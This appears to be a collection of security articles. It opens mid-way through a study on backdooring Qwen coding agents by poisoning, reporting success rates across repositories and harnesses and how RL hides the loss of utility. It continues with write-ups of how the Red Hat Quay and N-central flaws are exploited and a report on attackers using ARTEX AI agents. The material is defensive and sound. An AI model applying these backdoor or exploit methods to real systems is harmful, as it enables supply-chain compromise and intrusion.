The team fine-tuned Qwen3.5-4B and Qwen3.5-9B on roughly 2,400 correctly solved coding trajectories. Poisoned examples were paired with matched clean counterfactuals that preserved the surrounding task while removing the trigger and unsafe action, helping the model associate activation with the trigger rather than incidental repository content.

Generalization to unseen repositories

The evaluation included familiar task distributions and five permissively licensed repositories that were not used to construct the poisoned trajectories. Benign cover tasks naturally caused the agent to encounter triggers through directory listings, file reads, or searches.

Across both models and the tested action categories, in-distribution attack success ranged from 85.9% to 100%. The real test of attack success, however, is on previously unseen repositories. A naive transfer of our attack would only achieve 32.7%-63.4% attack success rate (ASR). Increasing the poisoning rate, our strongest attack configuration reached between 84.1% and 94.8% backdoor activation even on out of distribution data. False triggering was rare in the aggregate results. The gap between familiar and unseen settings shows that in-distribution evaluation can overstate backdoor robustness.

Transfer across coding harnesses

To test transferability (whether a backdoor implanted during training still fires when the model is deployed in a different agentic harness), the team evaluated the same backdoored checkpoints using harnesses the models hadn’t seen during training. When triggered, the model adapted the unsafe action to each harness’s tool interface, and the harness executed the tool call.

The 4B and 9B models reached 97.0% and 91.0% attack success under Claude Code, 74.0% and 77.0% under Pi, and 37.3% and 63.0% under Codex command-line interface (CLI). Because the backdoor lives in the model itself, these results don’t indicate a weakness in the default Claude Code or Codex CLI configurations. The risk is introduced only when a harness is configured to run a backdoored model checkpoint.

While consistently high, transfer varied by harness, with effects due primarily to different tool interfaces (e.g., Codex CLI) and invocation formats. Deployment evaluations should therefore use the production harness and its actual tool schemas.

Reasoning traces and utility recovery

Reasoning traces were critical in this experimental setup. Removing trigger- and action-related reasoning from poisoned examples reduced unseen-repository attack success from 94.8% to 1.0% for the 4B model and from 84.1% to 0% for the 9B model.

Full control over training makes model poisoning more flexible than dataset poisoning: the attacker can optimize for high attack success while minimizing degradation in general performance

Our team observed that, for small models, supervised fine-tuning reduced performance on benign coding tasks. We therefore followed SFT with a short reinforcement-learning phase to obtain a more reliable coding-agent backdoor. RL recovered much of that utility while leaving attack success largely unchanged. We even observed improved performance on coding benchmarks, which could make compromised models more attractive to users.

Figure 6: Clean-task utility and backdoor persistence before and after injecting the attack: Shows SFT utility loss, Group Relative Policy Optimization (GRPO) recovery, and largely unchanged attack success for both model sizes.

What the studies show about agent backdoors

Agent backdoors can turn a hidden model behavior into actions affecting code, data, credentials, and networks.

Compromise can enter through different post-training artifacts: data consumed by a victim-controlled training pipeline (dataset poisoning) or a checkpoint trained by the attacker before distribution (model poisoning).

Triggers can appear in ordinary user requests or in context gathered from repository files and tool results.

Backdoor behavior can generalize beyond exact trigger strings, familiar repositories, and the harness represented during training.

Capability evaluation and subsequent training are not sufficient evidence that a model is free of hidden conditional behavior.

Mitigation and protection guidance

Before training: Dataset governance and review

Verify dataset integrity: Pin reviewed versions by cryptographic hash and investigate unexpected changes.

Inspect training examples: Review responses, reasoning traces, and tool calls for actions that do not follow from the associated request.

Before deployment: Model evaluation and containment

Treat third-party checkpoints as untrusted dependencies and evaluate them in the agent configuration where they will run. Assume that a compromised model may behave normally on standard benchmarks and focus on both behavioral testing and containment:

Record checkpoint provenance: Capture the source, version, hash, available training disclosures, and review status.

Evaluate the deployed configuration: Test repository content, tool results, trigger variations, held-out tasks, and the production harness schemas.

Reduce tool access: Remove unnecessary tools and scope credentials, file paths, APIs, and network access to the agent’s task.

Isolate execution: Use sandboxes or containers and require approval for actions with material impact.

At runtime: Detection and response

Apply runtime protection where supported: Where supported and configured, Microsoft Defender real-time protection can evaluate supported agent interactions and block supported threat scenarios before execution. Coverage and intervention points vary by agent type; see Protect AI agents in real time using Microsoft Defender.

Monitor tool activity: Log the selected tool, model-supplied parameters, resulting action, and outbound connections.

Harden framework code: Review custom tool logic, validate model-supplied parameters, and keep agent frameworks patched. Several framework vulnerabilities involving code execution or secret exposure were addressed through upgrades; see When prompts become shells: RCE vulnerabilities in AI agent frameworks.

Investigate deviations: Alert on tool calls that do not follow from the user request or retrieved task context.

Figure 7: Strict authorization controls at the tool-execution layer can prevent a triggered backdoor from acting.

Securing agents beyond the model

Agent backdoors convert model-integrity failures into system actions. The studies show that hidden behaviors can enter through poisoning of fine-tuning data or direct model poisoning, activate from ordinary requests or environmental context, and generalize across trigger wording, repositories, and agent harnesses. Standard capability evaluations and subsequent training may not reveal or remove these conditional behaviors. Agent security therefore depends on treating post-training artifacts as part of the software supply chain and enforcing controls at the tool-execution boundary.

articles.title: Critical Red Hat Quay Flaw Lets Attackers Read and Overwrite All Private Container Images in a Registry
articles.context: A critical flaw in Red Hat Quay allows an attacker who can access a Quay registry to read and overwrite private container images in every repository
articles.full_text:
A critical flaw in Red Hat Quay allows an attacker who can access a Quay registry to read and overwrite private container images in every repository.

Quay enables anonymous access by default, and while it is enabled, the attacker needs no account. When it is off, anyone with a valid account can still exploit the flaw, Red Hat said yesterday. The company has released fixed builds for eight Quay 3 branches.

The flaw is tracked as CVE-2026-123710 (CVSS score: 9.8).

Quay uses keys it trusts to sign the access tokens that allow image pushes and pulls. The flaw lets an attacker add their own key to the keys Quay trusts, with no expiry date. Quay then accepts tokens signed with that key for any repository.

With those tokens, an attacker can retrieve private images and any secrets or credentials stored within them. The attacker can also push or overwrite images, and the change propagates to every system that later pulls those images.

The planted key survives restarts until someone removes it. It can also be used to delete the keys that running Quay instances use, so normal pushes and pulls start failing with authentication errors.

Quay's key server checks that a request to replace a key carries a token signed by a trusted key, with the expected audience and issuer. It does not check whether the token was issued for key rotation. An anonymous token from Quay's /v2/auth endpoint passes: Quay signs it with a trusted key, and the caller chooses its audience.

A second critical flaw, CVE-2026-110697 (CVSS score: 9.9), was disclosed at the same time. It lets a Quay user who can create a namespace steal other tenants' robot account tokens and use them to read, push, or overwrite those tenants' images.

This flaw is in the code that lists robot accounts. It builds an SQL LIKE pattern from the namespace name without escaping wildcard characters, and in SQL LIKE an underscore matches any single character.

So a namespace with an underscore in the right place can match another tenant's namespace and return its robot accounts, with their decrypted tokens. The attacker needs no elevated privileges, and the victim does not have to do anything.

Deleting the attacker's namespace also deletes the corresponding robot accounts, which can cut off systems that rely on them. Where Quay is the integrated registry for OpenShift, stolen robot credentials can be used to inject malicious images into CI/CD pipelines, the company says.

Red Hat's Dave O'Connor found both flaws. The logic behind CVE-2026-123710 has been in Quay since its first public commit, according to the bug report for that flaw.

Red Hat lists every version of Quay 3 and Quay 5 as affected by both flaws. For CVE-2026-123710, its guidance names standalone installs, Quay deployed by the Quay Operator on OpenShift, and the mirror registry for Red Hat OpenShift as affected.

Any Quay instance that untrusted clients can reach is exposed, including internal registries, the company says.

When checked today, the CVE entry for CVE-2026-123710 still showed every Quay package as affected, with no fix, even though each advisory lists the flaw.

The company recommends these steps:

At the proxy or load balancer, block the /keys endpoint for everything except trusted internal components.

Search the audit logs for service_key_rotate and service_key_delete events where expiration_date is null.

Remove any approved service keys you do not recognize.

Install the fixed release. Until it is running, an attacker can add a new key the same way, so deleting one does not last.

"Turning off anonymous access doesn't protect you," the company says in its key remediation article. A planted key also continues to work after password resets and changes to the robot token.

For CVE-2026-110697, the company's CVE page names the same eight releases as fixed, calls updating the only complete fix, and says Quay.io is already fixed. But none of the eight advisories list CVE-2026-110697.

Until an update is in place, the company suggests limiting who can create organizations or namespaces containing an underscore, rotating robot tokens for any namespace that matches an underscore namespace, and watching for pulls or pushes that do not fit normal robot use. These steps reduce the exposure, but the flaw remains.

The upstream fix adds the missing rotation check, requires keys added through the key server to have an expiry date, and stops callers from choosing a token's audience. The same change fixes the robot account search too.

articles.title: New N-central Exploits Work Against Patched Servers, Enable Root RCE and Windows SYSTEM Access
articles.context: Dewhurst said the development marks the first documented instance of exploitation attempts aimed at CVE-2026-90436, patches for which were released on November 6, 2026
articles.full_text:
N-able on Thursday said it's investigating a new public disclosure containing claims of additional vulnerabilities in on-premise versions of N-central running version 2026.4.1 HF2.

"Based on our initial review, the server issue described depends on a non-default configuration in which the Legacy API is turned on and exposed to the public internet," N-able said in a new advisory. "Legacy API is turned off by default in the product and is not recommended."

The company is urging customers to disable Legacy API immediately, if not already. It also noted that hosted environments are not affected by this issue.

The incident impacts the following services -

N-central On-premise (Americas)

N-central On-premise (APAC)

N-central On-premise (Europe)

The development comes days after N-able released 2026.4.1.26 to address a number of security flaws disclosed by independent security researcher Sean Bales earlier this week. The vulnerabilities are collectively tracked under the name Able2Shell.

The new shortcoming, also revealed by Bales, have been codenamed 4EverAble2Shell and Agent2Shell, adding the proof-of-concept (PoC) exploits successfully work against N-central 2026.4 Hotfix 2 (build 2026.4.1.26), the update N-able released on November 10, 2026, to resolve Able2Shell.

According to the researcher, 4EverAble2Shell enables unauthenticated remote code execution with root privileges on N-central servers. Agent2Shell, on the other hand, leverages more than 10 zero-day vulnerabilities to run commands on managed Windows agents as NT AUTHORITY\SYSTEM, assuming the attacker knows the target appliance ID.

Ryan Dewhurst, founder and CEO of Previdian, told The Hacker News that targeted N-central probing has been observed against 4EverAble2Shell within hours following the release of the PoC. The activity has originated from the IP address 157.20.241[.]16. There is no evidence of successful exploitation as of writing.

In the attack chain observed by the threat intelligence company, threat actors have been observed attempting to achieve initial code execution through a recently disclosed Apache Axis flaw (CVE-2026-90436, CVSS score: 9.8), followed by attempts to escalate privileges to root using 4EverAble2Shell, and then download and execute a shell script from 157.20.241[.]16 using curl.

Dewhurst said the development marks the first documented instance of exploitation attempts aimed at CVE-2026-90436, patches for which were released on November 6, 2026.

In a post shared on X, watchTowr also said it's seeing probes for 4EverAble2Shell targeting N-Centrals builds with the Legacy API enabled.

articles.title: ARTEX and AI-Powered Red Teaming Tools: What Defenders Need to Know
articles.context: Unit 42 Incident Response and Managed Threat Hunting teams observed this activity across multiple organizations and sectors, without exploiting a single software vulnerability
articles.full_text:
A rapidly expanding ecosystem of AI-enabled tools such as ARTEX and CyberStrikeAI — marketed for red teaming and penetration testing — are being used by attackers to execute offensive operations autonomously.

Their footprint is already substantial. Unit 42 has observed ARTEX used in intrusion attempts against multiple targets.

Our Incident Response team investigated multiple intrusions in which the attacker’s server hosted an ARTEX console or used infrastructure and user agents associated with ARTEX.

Separately, Unit 42 Managed Threat Hunting tracked a coordinated ARTEX campaign against customer cloud environments in sectors worldwide, including retail and consulting.

External scrutiny has already disrupted project lifecycles: the author of ARTEX recently made the repository closed-source and ceased public development to prevent misuse. Emerging alternatives are rapidly filling the void, introducing new capabilities that threat actors will inevitably co-opt.

Here, we share our observations of how attackers are using AI-powered red team tools, along with our recommendations for how defenders can mitigate.

Why Is ARTEX Such an Effective Tool for Attackers?

ARTEX and other red-teaming platforms are free, quick to deploy and need little more than access to a large language model (LLM).

ARTEX is an open-source, multi-agent AI penetration testing framework first published in mid-2026. It has been widely forked since.

Attackers can use ARTEX to evaluate responses, adapt when something fails and keep pursuing their objective. They can target the identity workflows and APIs that organizations expose to the internet, and then use the associated credentials and trust relationships to reach the cloud.

AI-Powered Red Teaming and Pentesting Ecosystem Infrastructure

As of October 2026, Unit 42 identified 1,323 internet-facing hosts running CyberStrikeAI and 609 running ARTEX. Notably, 21 hosts were running both at the same time.

Unit 42 analyzed 14 tools across the pentesting and red-teaming tool ecosystem, highlighting 12 emerging tools alongside CyberStrikeAI and ARTEX.

These tools can be broken down into four categories of AI assisted red team activities.

Category

Tools

Goal

Reconnaissance and attack-surface management

ARL, ARL-Next, Scope Sentry, Nemo, XingRin, OpenEASD

Identify what assets exist, what is exposed and what changes

Agent-led testing and vulnerability hunting

CyberStrikeAI, ARTEX, Cairn, PentAGI, AutoHunter

Manage what should be investigated and how the system can act on it

Source-code auditing and verification

DeepAudit, AIxVuln

Identify where source code might be vulnerable and what supports that finding

AI-system security assessment

AI-Infra-Guard

Identify if AI infrastructure, agents, tools and model interfaces are vulnerable or unreliable

Table 1. Tool categories.

Implications For Defenders

Defenders should be aware of the following implications of AI-powered red teaming platforms:

Lowered Skill Floor for Attackers

Adversaries no longer require specialized tradecraft to execute multi-stage, adaptive penetration testing.

Off-the-shelf tooling combined with LLMs like DeepSeek allows financially motivated actors to launch and manage dozens of complex, concurrent network intrusions for minimal compute cost.

Risk of Internet-Exposed Assets

Any internet-exposed asset, regardless of organizational size or sector, is equally likely to be impacted by automated, persistent intrusion attempts.

Attackers using the autonomous AI penetration testing framework ARTEX are turning public password reset pages and exposed APIs into a path to cloud access, sometimes in less than a day. Unit 42 Incident Response and Managed Threat Hunting teams observed this activity across multiple organizations and sectors, without exploiting a single software vulnerability.

Because these autonomous platforms cannot target what they cannot find, continuous discovery and mitigation of exposed edge assets remains an effective barrier against automated campaigns.

Proactive AI Adoption Helps Defenders

Autonomous testing frameworks rely on foundational LLM reasoning patterns. Therefore, there is some predictability to AI-powered adversary tooling.

Security teams do not need to guess an agent's methodology; they can deploy identical open-weight offensive frameworks internally to surface, validate and remediate vulnerable exposure before external agents identify them.

Defenders Benefit From Tracking Ecosystem Shifts

The rapid adoption curve of tools in this ecosystem highlights how quickly operational trends can shift. Keeping an eye on these developments provides practical defensive advantages:

Observing emerging agent-led frameworks allows teams to test new capabilities early in controlled environments.

Monitoring the infrastructure hosting these tools makes it possible to update perimeter blocks before active targeting begins.

Current AI-Powered Frameworks Are Noisy

Current autonomous frameworks prioritize rapid trial-and-error over stealth. In our study of a tool called Cairn, it generated hundreds of thousands of noisy, high-frequency requests across multiple edge protocols from a single origin IP address.

Organizations with unified perimeter telemetry and centralized logging can readily distinguish this brute-force agentic traffic from legitimate users and block campaigns at the network edge before exploitation occurs.

Defensive Deception Could Help

LLM-driven testing tools use target responses as context for follow up actions.

Defenders may be able to take advantage of this to trick attackers using AI-powered red teaming tools into wasting resources.

When a target serves identical, generic error codes or enforces silent connection throttling, an AI agent lacks the contextual cues needed to adapt. Deprived of environmental feedback, autonomous loops burn context windows and compute budgets on dead ends.

Recognizing an AI-Driven Operator

ARTEX is forked and modified constantly. Furthermore, attackers rotate infrastructure quickly, so indicators lose value fast. How the operator behaves is more durable, and the behavior across our observations consistently pointed to an automated planner reacting to what it sees. Table 2 shows the hallmarks of this behavior.

Hallmark

What We Observed

Think-then-act cadence

Bursts of one to 14 requests about a second apart, then a pause of 25–31 seconds, consistent with an agent waiting on a model inference call

Machine speed

Pivots within about one minute of a credential download. More than 200 client secrets validated in about three minutes

Spec-driven targeting

Routes from downloaded OpenAPI specifications and source maps targeted almost immediately

Self-correction

Failed requests (HTTP 422) adjusted and retried successfully moments later

Checking its own work

A GET to the same path after almost every successful write. Write-then-delete tests on storage buckets.

Canary inputs

Bogus usernames before real ones, and placeholder values such as evil[.]com, test@example[.]com and deadbeefdeadbeefdeadbeef12

Parallel targeting

An application delivery controller, more than a dozen VPN appliances, a NAS device, workforce identity and cloud ports attacked within the same hour

Recheck loops

Polling every 48 seconds for three days, and attack sequences replayed identically about 30 seconds apart

Table 2. Behavioral hallmarks of ARTEX-driven activity observed by Unit 42.

Any one of these traits could come from an unusually configured tool or a person testing an API by hand. Seen together, they point to autonomous tooling.

Despite the autonomous tooling, humans were not entirely absent from the attacks we observed. In one engagement, the attacker switched from scripted clients to a desktop browser for the password reset and first token request. This suggests a human in the loop, or browser automation, for the most sensitive steps.

Conclusion and Mitigations for ARTEX Attacks

AI-driven tooling is not inventing new attacks. Self-service abuse, exposed APIs and stored credentials are long-standing weak points.

What has changed is the pace and the persistence. An ARTEX operator can test every exposed workflow in parallel and switch routes within minutes of being blocked. It can act on a stolen credential within a minute of finding it.

Because the framework is open source and widely forked, indicator-based detection will not keep up.

Defenders who remove machine-readable attack maps, require authentication everywhere and build detections around operator behavior will be best placed to stop an AI-assisted attacker.

Autonomous tooling probes faster than people can review alerts. Defenses need to block by default and remove the credentials these tools are looking for. Organizations should:

Remove public attack maps. Take OpenAPI specifications, source maps and configuration files containing tokens or client IDs off internet-facing applications.

Reduce and understand your organization’s public footprint. Certificate transparency can create target lists for threat actors. In cloud environments, it is vital to understand if host fully qualified domain names (FQDNs) are public knowledge. Consider private certificate authorities to limit information disclosure and locking origin traffic to content delivery network (CDN)-only ingress where possible.

Require authentication on every write endpoint, including development and staging APIs.

Harden self-service flows. Rate-limit and bot-protect registration, password reset and verification code endpoints. Remove unauthenticated account-existence checks.

Protect federated identities. Block local passwords for workforce accounts in customer and partner identity providers, and make sure a password reset can never unlink a federated identity.

Get credentials out of reach. Replace long-lived cloud keys with role-based access, keep administrator credentials out of provisioning records and move function secrets to a secrets manager.

Enforce least privilege for workload roles and any function that can create roles, keys or tokens.

Hunt for behavior, not just indicators. Look for:

Canary usernames in identity provider logs

First use of a cloud key from a new IP address

Write-then-delete storage tests

Early-phase probing that precedes a later intrusion
